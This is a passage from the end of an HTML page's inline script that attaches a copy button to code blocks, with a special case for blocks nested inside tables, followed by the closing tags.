        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
